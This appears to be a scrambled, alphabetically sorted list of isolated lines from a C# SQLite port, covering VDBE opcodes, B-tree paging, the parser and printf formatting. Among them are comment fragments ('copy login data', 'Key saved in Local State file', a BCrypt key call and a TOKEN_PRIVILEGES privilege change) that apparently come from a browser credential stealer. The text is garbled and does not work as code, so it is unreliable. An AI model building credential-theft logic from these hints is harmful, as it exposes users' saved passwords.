              case 'Y':
              case 'd':
              case 'f':
              case 'j':
              case 'm':
              case 's':
              case 'w':
              cc = cc.pNext
              char affinity
              char ch
              char q = ( ( xtype == etSQLESCAPE3 ) 
              char x
              char[] _buf
              chngRowid = true
              clearYMD_HMS_TZ( p )
              closest = 0
              cnt = 1
              computeJD( p )
              computeJD( tx )
              computeYMD( p )
              computeYMD_HMS( p )
              const int openFlags =
              continue
              cost /= 3
              ctx.isError = 0
              ctx.pColl = null
              ctx.pFunc = pOp.p4.pFunc
              ctx.pMem = pMem = p.aMem[pOp.p3]
              ctx.s.db = db
              ctx.s.flags = MEM_Null
              ctx.s.xDel = null
              ctx.s.z = null
              data[addr 
              data[hdr 
              database (with some additional information - the nRec field
              day = tx.iJD / 86400000
              db.autoCommit = 1
              db.lastRowid = pContext.lastRowid
              db.lookaside.mxOut = db.lookaside.nOut
              default:
              default: z.Append( '%' )
              desiredAutoCommit = (u8)pOp.p1
              dest.affinity = (char)affinity
              dest.eDest = SRT_Exists
              dest.eDest = SRT_Mem
              divisor 
              double rA
              double rB
              e2 = 0
              e2 = exp
              eStatementOp = SAVEPOINT_ROLLBACK
              eType = IN_INDEX_INDEX
              else
              else if ( String.IsNullOrEmpty( z ) )
              else if ( c == '(' 
              else if ( c == ':' 
              else if ( desiredAutoCommit != db.autoCommit )
              else if ( flag_blanksign ) prefix = ' '
              else if ( flag_long )
              else if ( i 
              else if ( iCompare == 0 )
              else if ( pC.deferredMoveto )
              else if ( pC.pseudoTable )
              else if ( pOp.p2 == BTREE_FILE_FORMAT )
              else if ( pOp.p4type == P4_INT32 )
              else if ( rc == SQLITE_CANTOPEN )
              else if ( res != 0 )
              else if ( turnOnAC != 0 
              else prefix = '
              else return (char)( (i64)ap[vaNEXT - 1] )
              errMsg.db = pParse.db
              file_format = p.minWriteFileFormat
              flag_rtz = !flag_alternateform
              flag_rtz = false
              flags = pIn1.flags 
              for (
              for ( 
              for ( i = 0 
              for ( i = 2 
              for ( i = n = 0 
              for ( i = width 
              for ( idx = 1 
              for ( ii = 0 
              for ( int pD0 = 0 
              for ( int pD0 = pOp.p1 
              for ( j = 0 
              for ( length = 0 
              for (i = 1
              for temporary and transient files.
              goto abort_parse
              goto balance_cleanup
              goto case OE_Rollback
              goto case OP_Halt
              goto case OP_Rewind
              goto case OP_String
              goto default
              goto end_allocate_page
              goto end_playback
              goto exec_out
              goto failed
              goto insert_cleanup
              goto lookupname_end
              goto moveto_finish
              goto multi_select_end
              goto select_end
              goto vdbe_error_halt
              goto vdbe_return
              h
              i
              i 
              i = ( prefix != '
              i = (int)i64Temp
              i = aOp[pc 
              i = p.contextStackTop
              i64 R
              i64 a
              i64 b
              i64 i64Temp = 0
              i64 iA
              i64 iB
              i64 iEnd = MIN( PENDING_BYTE 
              i64 iKey
              i64 iOff
              i64 n64
              i64 nByte
              i64 nEntry = 0
              i64 payloadSize64
              i64 rowid
              i64 v
              i64 val = 0
              iBreak = sqlite3VdbeMakeLabel( v )
              iCnt = db.activeVdbeCnt
              iCont = sqlite3VdbeMakeLabel( v )
              iCookie = pOp.p3
              iDb = pOp.p1
              iDb = pOp.p3
              iKey = 0
              iKey = pKey.u.i
              iMeta = 0
              iNextOld = i 
              iOff 
              iOff = PENDING_BYTE 
              iReg = 
              iRollback = pOp.p2
              iRoot = pBest.tnum
              iSet = pOp.p4.i
              iStart = sqlite3VdbeCurrentAddr( v )
              iVal = -iVal
              if ( !( p.approx 
              if ( !( pIdx.onError == OE_Default 
              if ( !String.IsNullOrEmpty( zTrace ) )
              if ( !sqlite3Isdigit( z2[z2Index] ) ) z2Index
              if ( ( ( c 
              if ( ( ( pIn1.flags 
              if ( ( ( pIn2.flags 
              if ( ( ctx.pFunc.flags 
              if ( ( flags 
              if ( ( iVal << 1 ) == 0 )
              if ( ( opProperty 
              if ( ( pCrsr = pC.pCursor ) != null )
              if ( ( pData.flags 
              if ( ( pDef.flags 
              if ( ( pIdx.flags 
              if ( ( pIn1.flags 
              if ( ( pIn2.flags 
              if ( ( pIn3.flags 
              if ( ( pOp.p2 
              if ( ( pOp.p5 
              if ( ( pOut.flags 
              if ( (i64)ap[vaNEXT - 1] == 0 )
              if ( //prNotFound != null 
              if ( 0 == pNC.allowAgg 
              if ( ALWAYS( iCol >= 0 
              if ( ALWAYS( pC.pCursor != null ) )
              if ( ALWAYS( pCrsr != null ) )
              if ( ALWAYS( pEList != null ) 
              if ( ALWAYS( rc == SQLITE_OK ) )
              if ( ExpandBlob( pIn1 ) != 0 
              if ( IdChar( (u8)zSql[zIdx] ) )
              if ( NEVER( j >= pIdx.nColumn ) ) return null
              if ( NEVER( pC.pCursor == null ) )
              if ( NEVER( rc != SQLITE_OK ) )
              if ( NEVER( rc != SQLITE_OK ) ) goto abort_due_to_error
              if ( Z > n ) Z -= 7
              if ( _bufOrd != null )
              if ( aOffset[p2] != 0 )
              if ( aRoot == null ) goto no_mem
              if ( affRight != 0 
              if ( affinity != '
              if ( affinity == '
              if ( azCols == null )
              if ( buf[bufpt - 1] == '.' )
              if ( c != 0 )
              if ( c != 0 ) i
              if ( c < 0x80 ) c = sqlite3UpperToLower[c]
              if ( c == c2 )
              if ( c == delim )
              if ( c >= prior_c 
              if ( c2 < 0x80 ) c2 = sqlite3UpperToLower[c2]
              if ( cc.pNext == pTrigger )
              if ( ctx.isError != 0 )
              if ( ctx.pVdbeFunc != null )
              if ( db.autoCommit == 0 
              if ( db.u1.isInterrupted )
              if ( db.u1.isInterrupted ) goto abort_due_to_interrupt
              if ( db.xUpdateCallback != null 
              if ( dest.eDest == SRT_Output )
              if ( exp < -4 
              if ( exp < 0 )
              if ( exp > 350 )
              if ( exp >= 100 )
              if ( flag_longlong )
              if ( flag_plussign ) prefix = '
              if ( getBoolean( zRight ) != 0 )
              if ( h >= BITVEC_NINT ) h = 0
              if ( i % 2 != 0 
              if ( i < 32 
              if ( i >= p.contextStackDepth )
              if ( i >= pAggInfo.nFunc )
              if ( iCnt > 1 )
              if ( iCol < 0 )
              if ( iCol < 0 ) iCol = pTab.iPKey
              if ( iCompare < 0 )
              if ( iMeta != pOp.p2 )
              if ( iSet != 0 )
              if ( iSet >= 0 )
              if ( isnull ) escarg = ( xtype == etSQLESCAPE2 ) 
              if ( j < pTabList.nSrc )
              if ( j == pTab.iPKey )
              if ( len <= nIn 
              if ( n > etBUFSIZE )
              if ( nByte > db.aLimit[SQLITE_LIMIT_LENGTH] )
              if ( nErr == 0 )
              if ( nRef != pNC.nRef )
              if ( nVarint < sqlite3VarintLen( (u64)nHdr ) )
              if ( nZero != 0 )
              if ( needQuote ) buf[bufpt 
              if ( null == pBest 
              if ( null == pColl ) pColl = db.pDfltColl
              if ( p.xDel != null )
              if ( p1 == SAVEPOINT_BEGIN )
              if ( pBt != null )
              if ( pC == null )
              if ( pC.cacheStatus == p.cacheCtr )
              if ( pC.isIndex )
              if ( pC.nullRow )
              if ( pC.pCursor != null )
              if ( pC.pseudoTable )
              if ( pCol.iSorterColumn >= j )
              if ( pColl != null )
              if ( pColumn.a[j].idx == i ) break
              if ( pCrsr != null )
              if ( pCrsr == null )
              if ( pCur == null ) goto no_mem
              if ( pCx == null ) goto no_mem
              if ( pDef == null )
              if ( pExpr.u.zToken.Length > 1 )
              if ( pIdx.onError == OE_Default )
              if ( pIn1.u.i < 0 )
              if ( pIn1.u.i < pIn2.u.i )
              if ( pIn1.u.i == 0 )
              if ( pIn1.u.i > 0 )
              if ( pItem.zAlias != null )
              if ( pItem.zDatabase != null )
              if ( pMinMax != null )///
              if ( pNC.isCheck != 0 )
              if ( pNC.pParse != null )
              if ( pOp.opcode == OP_And )
              if ( pOp.opcode == OP_CreateTable )
              if ( pOp.opcode == OP_Found )
              if ( pOp.opcode == OP_OpenWrite )
              if ( pOp.p1 != 0 )
              if ( pOp.p1 == 0 )
              if ( pOp.p1 == 1 )
              if ( pOp.p1 > db.aLimit[SQLITE_LIMIT_LENGTH] )
              if ( pOp.p2 != 0 
              if ( pOp.p2 == BTREE_SCHEMA_VERSION )
              if ( pOp.p2 > 0 
              if ( pOp.p3 != 0 )
              if ( pOp.p4.z != null )
              if ( pOp.p4type == P4_FUNCDEF )
              if ( pOp.p4type == P4_KEYINFO )
              if ( pOp.p5 != 0 )
              if ( pParse.rc != SQLITE_OK )
              if ( pSubWInfo != null )
              if ( pToken != null )
              if ( pX != null )
              if ( payloadSize == 0 )
              if ( payloadSize > (u32)db.aLimit[SQLITE_LIMIT_LENGTH] )
              if ( rNotFound == 0 )
              if ( rc != 0 )
              if ( rc != SQLITE_OK ) goto commit_phase_one_exit
              if ( rc != SQLITE_OK ) return rc
              if ( rc == SQLITE_BUSY )
              if ( rc == SQLITE_DONE )
              if ( rc == SQLITE_EMPTY )
              if ( rc == SQLITE_NOMEM )
              if ( rc == SQLITE_OK 
              if ( rc == SQLITE_OK )
              if ( realvalue >= 10.0 ) { realvalue 
              if ( res != 0 )
              if ( res == 0 )
              if ( sAggInfo.aCol[i].iSorterColumn >= j )
              if ( sqlite3PendingByte != newVal )
              if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
              if ( sqlite3SafetyOff( db ) )
              if ( sqlite3SafetyOff( db ) ) goto abort_due_to_misuse
              if ( sqlite3SafetyOn( db ) ) goto abort_due_to_misuse
              if ( sqlite3VdbeMemTooBig( pMem ) )
              if ( sqlite3VdbeMemTooBig( pOut ) )
              if ( ss != null )
              if ( turnOnAC != 0 
              if ( v < 0 )
              if ( v1 == 2 )
              if ( x >= 4 
              if ( y != r )
              if ( zConverted[i] == '
              if ( zIdx == zSql.Length ) return 0
              if ( zIdx == zSql.Length ) return state == 0 
              if ( zSql[zIdx 
              if ( zTName != null 
              if ( zTName != null )
              if ( zTabName == null )
              if ( z[0] == '-' ) tx.iJD = -tx.iJD
              if ((--nOverflow) > 0)
              if (0 == leafCorrection)
              if (0 == leafData) continue
              if (a 
              if (closest < k - 1)
              if (dist < 0) dist = -dist
              if (iNewTrunk > mxPage)
              if (null == pPrevTrunk)
              if (pCheck.pBt.autoVacuum)
              if (pOld.nOverflow != 0)
              if (rc != 0) goto moveto_finish
              if (rc != SQLITE_OK)
              if (rc == SQLITE_OK)
              if (szCell[i] > pNew.minLocal)
              if (yyTraceFILE != null)
              in a state which would cause damage to the database
              inMultIsEst = 1
              inMultiplier 
              inReg = pCol.iMem
              inReg = pExpr.iColumn 
              inReg = pInfo.aFunc[pExpr.iAgg].iMem
              inReg = target
              inserted into.
              int alreadyExists
              int avail
              int bRev
              int c
              int c = zSql[zIdx]
              int c1
              int cnt
              int desiredAutoCommit
              int dist
              int exists
              int f = SQLITE_OPEN_READONLY 
              int file_format
              int flags
              int i
              int i = pList.nExpr
              int iAddr
              int iCnt
              int iCookie
              int iDb
              int iDummy0 = 0
              int iMem = 
              int iMoved = 0
              int iReg
              int iRollback
              int iSavepoint
              int iSet
              int idx
              int ii
              int j
              int len
              int n
              int nByte
              int nChange
              int nErr = 0
              int nField
              int nHdr
              int nKey
              int nName
              int nPad = width - length
              int nPage = 0
              int nRef = pNC.nRef
              int nRoot
              int nVarint
              int nZero
              int noContent
              int oc
              int op
              int p1
              int p2
              int pcDest
              int pgno
              int pre
              int r1 = sqlite3GetTempReg( pParse )
              int r2 = sqlite3GetTempReg( pParse )
              int res
              int res = 0
              int seekResult
              int szHdr
              int turnOnAC
              int v1
              int v2
              int wrFlag
              int x = (int)( longvalue % 10 )
              int y = (int)r
              int z2Index = 0
              int zEndHdr
              int zIdx
              int[] aRoot
              invalidateCursorsOnModifiedBtrees( db )
              is repeated by the number of times the precision specifies.
              isDivider = 0 == leafData 
              isDivider = 1
              is_agg = false
              is_agg = pDef.xFunc == null
              j = -1
              j = 0
              j = i - nHidden
              j1 = sqlite3VdbeCurrentAddr( v )
              keyColumn = i
              lastTokenParsed = tokenType
              len
              len = aLen[i]
              length = 1
              length = 3
              length = j
              length = precision
              length = sqlite3Strlen30( bufpt )
              length = width
              length = width = 0
              lwr = idx
              m 
              n 
              n = 0
              n = pOp.p3
              n = pOp.p5
              n64 = 0
              nByte = (i64)( (u64)nHdr 
              nByte = 0
              nByte = pIn1.n 
              nCell = (int)pCur.info.nKey
              nChange = 0
              nData = 0
              nDestTruncate--
              nErr
              nField = 0
              nField = pC.nField
              nField = pCx.pKeyInfo.nField
              nField = pOp.p1
              nField = pOp.p2
              nHdr 
              nHdr = 0
              nHidden
              nRetry = 0
              nRoot = pOp.p2
              nRow /= 3
              nSignificant
              nZero = 0
              needQuote = !isnull 
              needSync = true
              newMax = atoi( zRight )
              nextCase = sqlite3VdbeMakeLabel( v )
              nextPage = sqlite3Get4byte(aPayload)
              nx = 2
              nx = 4
              of the journal header - being written in between the two
              offset = 0
              okToChngToIN = 0
              op = SRT_Except
              op = SRT_Union
              opCompare.op = TK_EQ
              opCompare.pLeft = cacheX
              openAll = true
              p.D = 1
              p.M 
              p.M -= x 
              p.M = 1
              p.Y 
              p.aCounter[SQLITE_STMTSTATUS_SORT - 1]
              p.aMem[pOp.p1] = pMem
              p.addrOpenEphm[0] = addr
              p.apCsr[pOp.p1] = null
              p.cacheCtr = ( p.cacheCtr 
              p.contextStack[i] = new Context()
              p.errorAction = (u8)pOp.p2
              p.iJD 
              p.iJD -= (long)c1
              p.iJD = (long)( ( p.iJD 
              p.iSum 
              p.nChange = 0
              p.nChange = pContext.nChange
              p.pResultSet = new Mem[pOp.p2]
              p.pRightmost.selFlags 
              p.pc = pc
              p.pc = pc 
              p.rc = pOp.p1
              p.rc = rc
              p.validJD = 0
              p.validTZ = 0
              p.x.pSelect = yymsp[-1].minor.yy3
              p.xCmp = null
              p1 = pOp.p1
              p1 = pOp.p1 - 1
              p2 = pOp.p2
              p4 = null
              pBt = db.aDb[pOp.p1].pBt
              pBufOffset 
              pC = null
              pC = p.apCsr[p1]
              pC = p.apCsr[pOp.p1]
              pC.cacheStatus = CACHE_STALE
              pC.deferredMoveto = false
              pC.nullRow = res == 1 
              pC.nullRow = true
              pC.rowidIsValid = false
              pCache.apHash[h] = pPage.pNext
              pCell 
              pCellKey = new byte[nCell]
              pCellKey = null
              pCol = pTab.aCol[iCol]
              pCol = pTab.aCol[j]
              pColl = pTerm.pColl
              pColumn.a[i].idx = j
              pContext = p.contextStack[--p.contextStackTop]
              pContext = p.contextStack[i]
              pContext.lastRowid = db.lastRowid
              pContext.nChange = p.nChange
              pCrsr = p.apCsr[pOp.p1].pCursor
              pCrsr = pC.pCursor
              pCrsr = pCx.pCursor
              pCur.aiIdx[0] = 0
              pCur.aiIdx[1] = 0
              pCur.iPage = 1
              pCur.nullRow = true
              pCur.pKeyInfo = pKeyInfo
              pCx = p.apCsr[pOp.p1]
              pCx.cacheStatus = CACHE_STALE
              pCx.ephemPseudoTable = pOp.p2 != 0 
              pCx.isIndex = !pCx.isTable
              pCx.isIndex = false
              pCx.isTable = true
              pCx.nullRow = true
              pCx.pseudoTable = true
              pCx.seekResult = 0
              pData = p.aMem[pOp.p2]
              pDb = db.aDb[iDb]
              pDb = db.aDb[pOp.p1]
              pDel = pMinMax
              pDest = p.aMem[pOp.p3]
              pDest.nMem = pIn.nMem
              pEList = pExpr.x.pSelect.pEList
              pExpr.affinity == OE_Abort 
              pExpr.affinity == OE_Fail )
              pExpr.iAgg = (short)i
              pExpr.iTable = pItem.iCursor
              pExpr.op = TK_AGG_FUNCTION
              pExpr.pAggInfo = pAggInfo
              pExpr.pTab = pTab
              pFKey.aCol[i].iFrom = j
              pFarg = null
              pFarg = pExpr.x.pList
              pFree = pSpace
              pFrom = pTabList.a[i]
              pIdx = p.aMem[pOp.p1]
              pIdx.nColumn > 1 
              pIn1 = p.aMem[pOp.p1]
              pIn1.flags 
              pIn1.flags = (u16)( pIn1.flags 
              pIn1.flags = MEM_Int
              pIn1.u.i 
              pIn1.u.i = pc
              pIn2 = p.aMem[pOp.p2]
              pIn3 = p.aMem[pOp.p3]
              pKey = p.aMem[pOp.p3]
              pKeyInfo = null
              pKeyInfo = pOp.p4.pKeyInfo
              pList.a[i].zName = zSpan
              pMatch = null
              pMatch = pItem
              pMem = p.aMem[pOp.p1]
              pMem.flags = (u16)( sqlite3IsNaN( pMem.r ) 
              pMem.flags = MEM_Blob 
              pMem.flags = MEM_Int
              pMem.flags = MEM_Real
              pMem.flags = MEM_Str 
              pMem.n
              pMem.n = len
              pMem.n = pMem.z.Length
              pMem.r = BitConverter.Int64BitsToDouble( (long)x )
              pMem.u.i = (i64)x
              pMem.z = null
              pMem.zBLOB = new byte[len]
              pMem.zBLOB = null
              pNC.hasAgg = 1
              pNC.nErr
              pNew = apNew[
              pNew.a[pNew.nExpr - 1].zName = a[k].zName
              pNew.a[pNew.nExpr - 1].zSpan = a[k].zSpan
              pNewTrunk.aData[0 
              pOld = apCopy[
              pOp.opcode = OP_IdxRowid
              pOp.opcode = OP_NewRowid
              pOp.opcode = OP_Noop
              pOp.opcode = OP_String
              pOp.p1 = baseCur
              pOp.p1 = pLevel.iIdxCur
              pOp.p1 = sqlite3Strlen30( pOp.p4.z )
              pOp.p2 = regRowid
              pOp.p3
              pOp.p3 = regAutoinc
              pOrTerm.wtFlags = (u8)( pOrTerm.wtFlags 
              pOrig = pEList.a[j].pExpr
              pOut = p.aMem[pOp.p2]
              pOut = p.aMem[pOp.p3]
              pOut.enc = SQLITE_UTF8
              pOut.enc = encoding
              pOut.flags 
              pOut.flags = MEM_Blob 
              pOut.flags = MEM_Int
              pOut.flags = MEM_Real
              pOut.flags = MEM_Str 
              pOut.n = (int)n
              pOut.n = (int)nByte
              pOut.n = pOp.p1
              pOut.r = pOp.p4.pReal
              pOut.u.i = (int)iMeta
              pOut.u.i = (long)p.apCsr[pOp.p1].seqCount
              pOut.u.i = (long)v
              pOut.u.i = a
              pOut.u.i = nEntry
              pOut.u.i = pOp.p1
              pOut.u.i = pOp.p4.pI64
              pOut.u.i = pgno
              pOut.xDel = null
              pOut.z = null
              pOut.z = pOp.p4.z
              pOut.zBLOB = (byte[])zNewRecord.Clone()
              pOut.zBLOB = null
              pPage.flags 
              pPager = sqlite3BtreePager( db.aDb[p1].pBt )
              pPager.changeCountDone = true
              pPager.journalOff 
              pPager.journalOff = szJ
              pPager.needSync = true
              pParse.nErr
              pPg.flags 
              pPgno = iPage
              pRes = 0
              pRowidExpr = pChanges.a[i].pExpr
              pSchema = pTab.pSchema
              pStmt = null
              pTab.aCol[iCol].notNull == 0 )
              pTerm.flags 
              pTerm.pColl = pColl
              pTest = opCompare
              pVal = p.aMem[pOp.p2]
              pValue = -v
              pX = pDb.pBt
              pager_reset( pPager )
              payloadSize = 0
              payloadSize64 = 0
              pc = (int)pIn1.u.i
              pc = pOp.p2 - 1
              pc = pcDest
              pcDest = (int)pIn1.u.i
              pgno = 0
              pgnoOvfl
              pnEntry = nEntry
              pnErr = p.aMem[pOp.p3]
              pnErr.u.i -= nErr
              point of causing damage to the database during rollback.
              pre = infop.prefix
              precision = precision 
              precision = width - ( ( prefix != '
              prefix = '
              prefix = '-'
              prior_c = 0
              prior_c = c2
              pzBuffer = zAlloc
              r = new UnpackedRecord()
              r1 = 0
              r1 = sqlite3GetTempReg( pParse )
              r2 = regFree2 = sqlite3GetTempReg( pParse )
              r2 = sqlite3GetTempReg( pParse )
              rNotFound = 
              rc = 0
              rc = 1
              rc = ExpandBlob( pIn1 )
              rc = SQLITE_ABORT
              rc = SQLITE_CORRUPT_BKPT()
              rc = SQLITE_INTERRUPT
              rc = SQLITE_OK
              rc = SQLITE_ROW
              rc = newDatabase(pBt)
              rc = pOp.opcode == OP_Next 
              rc = rc2
              rc = sqlite3BtreeDelete( pC.pCursor )
              rc = sqlite3BtreeIncrVacuum( pBt )
              rc = sqlite3PagerWrite( pPage )
              rc = sqlite3PagerWrite(pNewTrunk.pDbPage)
              rc = sqlite3VdbeCursorMoveto( pC )
              rc = sqlite3VdbeHalt( p )
              rc = sqlite3VdbeMemMakeWriteable( pDest )
              rc == SQLITE_OK 
              realvalue 
              realvalue = -realvalue
              ref pCx.pBt )
              reg = 
              regFree1 = r1 = sqlite3GetTempReg( pParse )
              releasePage(pLastPg)
              releasePage(pNewTrunk)
              releasePage(pOvfl)
              res = 0
              res = 1
              return
              return (char)ap[vaNEXT - 1]
              return (string)ap[vaNEXT - 1].ToString()
              return 0
              return 1
              return 2
              return SQLITE_BUSY
              return SQLITE_CORRUPT_BKPT()
              return SQLITE_OK
              return WRC_Abort
              return WRC_Prune
              return false
              return i
              return i 
              return null
              return rc
              return true
              return yy_action[j]
              rowid = 0
              sAggInfo.directMode = 1
              sMem = new Mem()
              searchList = 0
              seenReplace = true
              sqlite3BeginBenignMalloc()
              sqlite3BtreeEnterAll( db )
              sqlite3BtreeLeaveAll( db )
              sqlite3BtreeMutexArrayLeave( p.aMutex )
              sqlite3CloseSavepoints( db )
              sqlite3CommitInternalChanges( db )
              sqlite3Dequote( ref pNew.u.zToken )
              sqlite3EndBenignMalloc()
              sqlite3ExprCachePush( pParse )
              sqlite3OsCloseFree( pMaster )
              sqlite3PCacheSetDefault()
              sqlite3PagerDontWrite(pPage.pDbPage)
              sqlite3PagerUnref( pPage )
              sqlite3PagerUnref( pSrcPg )
              sqlite3PagerUnref(pDbPage)
              sqlite3RollbackAll( db )
              sqlite3SrcListShiftJoinType(yymsp[-4].minor.yy65)
              sqlite3VdbeFinalize( pStmt )
              sqlite3VdbeMemIntegerify( pIn1 )
              sqlite3VdbeMemIntegerify( pIn2 )
              sqlite3VdbeMemIntegerify( pIn3 )
              sqlite3VdbeMemRelease( ctx.s )
              sqlite3VdbeMemSetNull( pIn1 )
              sqlite3VdbeMemSetNull( pOut )
              sqlite3VtabUnlock( (VTable)p4 )
              sqlite3_context ctx = new sqlite3_context()
              sqlite3_int64 Z
              sqlite3_int64 day
              sqlite3_module pModule
              sqlite3_search_count.iValue--
              sqlite3_sort_count.iValue
              sqlite3_value[] apVal
              sqlite3_vtab pVtab
              string z
              string z2 = z.ToString()
              string zAffinity
              string zDb
              string zErr
              string zMaster
              string zMsg
              string zName
              string zSep
              string zSql
              string zTabName = pFrom.zAlias
              string zTbl
              string zTrace
              supplied.
              switch ( infop._base )
              switch ( pOp.opcode )
              syncs).  If we assume that writing a
              szCell[nCell] = 4
              szPageDflt = (u16)pPager.sectorSize
              szPageDflt = SQLITE_MAX_DEFAULT_PAGE_SIZE
              tableSeen = 1
              tempWC.a = new WhereTerm[2]
              tempWC.a[0] = pOrTerm
              tempWC.nTerm = 1
              tempWC.op = TK_AND
              tempWC.pMaskSet = pWC.pMaskSet
              tempWC.pParse = pWC.pParse
              testcase( ( pExpr.flags 
              testcase( aListelem[i 
              testcase( pOrTerm.wtFlags 
              testcase( pTest.op == TK_COLUMN )
              testcase( pX.op == TK_COLUMN )
              testcase( pX.op == TK_REGISTER )
              testcase( rc == SQLITE_NOMEM )
              testcase( regFree1 == 0 )
              testcase( regFree2 == 0 )
              testcase(iNewTrunk == mxPage)
              that an inopertune power failure could leave the journal
              the right of the i-th sibling page.
              this stores a pointer to the SELECT statement. Otherwise NULL.
              this stores values to be inserted. Otherwise NULL.
              tmp = zWhere
              token = tkOTHER
              token = tkSEMI
              token = tkWS
              tokenType = TK_BITOR
              tokenType = TK_BLOB
              tokenType = TK_CONCAT
              tokenType = TK_DOT
              tokenType = TK_FLOAT
              tokenType = TK_GE
              tokenType = TK_GT
              tokenType = TK_ID
              tokenType = TK_ILLEGAL
              tokenType = TK_LE
              tokenType = TK_LSHIFT
              tokenType = TK_LT
              tokenType = TK_NE
              tokenType = TK_REGISTER
              tokenType = TK_RSHIFT
              tokenType = TK_SLASH
              tokenType = TK_SPACE
              tokenType = TK_STRING
              turnOnAC = ( desiredAutoCommit != 0 
              tx = new DateTime()
              tx.iJD -= 43200000
              tx.iJD -= day 
              u16 ii
              u16 nField
              u32 Dummy0 = 0
              u32 i
              u32 iMeta
              u32 iMeta = 0
              u32 n
              u32 offset
              u32 payloadSize
              u32 serial_type
              u32[] aOffset
              u32[] aType
              u64 nData
              u64 offset64
              u8[] pCellBody = new u8[pPage.aData.Length - pCell 
              u8[] pCellKey
              u8[] pSpace = new u8[pCur.pBt.pageSize]
              u8[] zerobyte = new u8[1]
              unionTab = dest.iParm
              unionTab = pParse.nTab
              upr = lwr - 1
              v = 0
              v1 = v1 
              when it is rolled back.
              while ( buf[bufpt - 1] == '0' ) buf[--bufpt] = '
              while ( c2 != 0 
              while ( n-- != 0 )
              while ( n-- > 0 )
              while ( nPad-- != 0 ) buf[( bufpt
              while ( pFirst.pPrior != null ) pFirst = pFirst.pPrior
              while ( realvalue < 1.0 ) { realvalue 
              while ( realvalue < 1e-8 ) { realvalue 
              while ( realvalue >= 10.0 
              while ( realvalue >= 1e32 
              while ( realvalue >= 1e8 
              while ( z.Length > iOffset 
              while ( zIdx < zSql.Length 
              wsFlags 
              wsFlags = WHERE_COLUMN_RANGE
              x = p.M > 0 
              xtype = infop.type
              y = (int)r
              yygotominor.yy346.pExpr = null
              yygotominor.yy346.pExpr.affinity = (char)OE_Ignore
              yygotominor.yy346.pExpr.affinity = (char)yymsp[-3].minor.yy328
              yygotominor.yy346.pExpr.flags 
              yygotominor.yy346.pExpr.op = TK_CONST_FUNC
              yygotominor.yy346.pExpr.x.pList = pList
              yygotominor.yy346.pExpr.x.pList = yymsp[-1].minor.yy14
              yygotominor.yy346.pExpr.x.pList = yymsp[-2].minor.yy14
              yygotominor.yy346.pExpr.x.pSelect = yymsp[-1].minor.yy3
              yygotominor.yy65 = yymsp[-4].minor.yy65
              yymsp[0].minor.yy3.op = (u8)yymsp[-1].minor.yy328
              yymsp[0].minor.yy3.pPrior = yymsp[-2].minor.yy3
              z.Append( '
              zAffinity = ( pOp.p4.z == null 
              zAffinity = pOp.p4.z
              zColumn = pRight.pRight.u.zToken
              zColumn = pRight.u.zToken
              zDb = null
              zDb = pExpr.pLeft.u.zToken
              zDx
              zErr = sqlite3StrAccumFinish( errMsg )
              zIdx
              zIdx 
              zName = pOp.p4.z
              zNewRecord = new byte[nByte]
              zOriginTab = pTab.zName
              zRec = null
              zSep = pIdx.nColumn > 1 
              zTName = null
              zTName = pE.pLeft.u.zToken
              zTable = pExpr.pLeft.u.zToken
              zTable = pRight.pLeft.u.zToken
              zTemp.Append( pMem.z )
              zTrace = ( pOp.p4.z != null 
              {
              {  /
              {//IdChar(c) ){
              }
              }              //pOut.z[nByte] = 0
              } /
             /
             // In C
             1234567890
             UNION ALL         UNION            EXCEPT          INTERSECT
             UNION ALL.  EXCEPT and INSERTSECT never output a row that
             appears only in B.)
             of the compound query.
             of the compound query.  (Only generated for UNION and
             sizeof(
            ( ( pPg.flags 
            ( pPager.sync_flags == SQLITE_SYNC_FULL 
            ( sqlite3Isdigit( z[iOffset 
            (rc = sqlite3PagerWrite(pPage.pDbPage))
            )
            ) )
            ){
            ...
            /
            //
            //    
            //      
            //                                  dwDummy )
            //        dwRet = GetDiskFreeSpaceA((CHAR
            //      break
            //     ref dwDummy )
            //    break
            //    if ( 
            //    {
            //    }
            //  /
            //  CHAR
            //  for ( 
            //  if ( 
            //  pParse.nVarExprAlloc
            //  return
            //  {
            //  }
            // Create dictionary to translate Guids to human readable elements
            // Now we create a TOKEN_PRIVILEGES structure with our modifications
            // Return all table names in the ArrayList
            // calles SQLite function that executes non-query
            // closes the database if there is one opened
            // compiled query
            // executes query that select names of all tables in master table of the database
            // finalize executing this query
            // opens database 
            // reads columns one by one
            // reads rows
            // returns number of columns returned by statement
            // returns table
            // table for result of query
            //)
            //------------ pCell -= 4
            ////if ( 0 == db.mallocFailed )
            //Debug.Assert( p.db.mallocFailed != 0 )
            //Debugger.Break()
            //Get key with regex.
            //Key saved in Local State file
            //TESTONLY( nPage
            //VVA_ONLY( int iCacheLevel = pParse.iCacheLevel
            //all.n = (int)(yymsp[0].minor.yy0.z - yymsp[-3].minor.yy0.z) 
            //all.z = yymsp[-3].minor.yy0.z
            //bufpt = 0
            //copy login data
            //for ( 
            //if ( db.mallocFailed != 0 )
            //if ( sqlite3GlobalConfig.m.xMalloc == null ) sqlite3MemSetDefault()
            //if ( zTemp == null )
            //memset( 
            //pNew.u.zToken = (char
            //pNew.u.zToken[pToken.n] = 0
            //return pOvfl.pCell
            //sqlite3DbReallocOrFree(
            //sqlite3PageFree( ref  pPager.pTmpSpace )
            //testcase( db.mallocFailed )
            //typedef void (
            //yygotominor.yy0.n = (int)( yymsp[0].minor.yy0.z[yymsp[0].minor.yy0.n] - yymsp[-3].minor.yy0.z )
            //yygotominor.yy0.n = (int)(pParse.sLastToken.z-yymsp[-2].minor.yy0.z) 
            //yygotominor.yy0.n = (int)(yymsp[0].minor.yy0.z[yymsp[0].minor.yy0.n] - yymsp[-5].minor.yy0.z)
            //yygotominor.yy0.z = yymsp[-2].minor.yy0.z
            //yygotominor.yy0.z = yymsp[-3].minor.yy0.z
            //yygotominor.yy0.z = yymsp[-5].minor.yy0.z
            //yygotominor.yy0.z=yymsp[-1].minor.yy0.z
            //z 
            //zAlloc 
            //zName[nName] = 0
            //zTemp[i] = 0
            //{
            //}
            //}else{
            2. A pointer to the list of characters to be output
            3. An integer number of characters to be output.
            AggInfo pAggInfo = pExpr.pAggInfo
            AggInfo pInfo = pExpr.pAggInfo
            AggInfo_col pCol = pAggInfo.aCol[pExpr.iAgg]
            AppEnd = 10000
            ArrayList list = new ArrayList()
            BCrypt.BCryptDestroyKey(hKey)
            Bitmask b = 0
            Bitmask b = pTabItem.colUsed
            Btree pBt = pDb.pBt
            Buffer.BlockCopy(pOld.aOvfl[-(iFOFC 
            CSSQLite.sqlite3_close( db )
            CellInfo info = new CellInfo()
            CollSeq p = aColl[j]
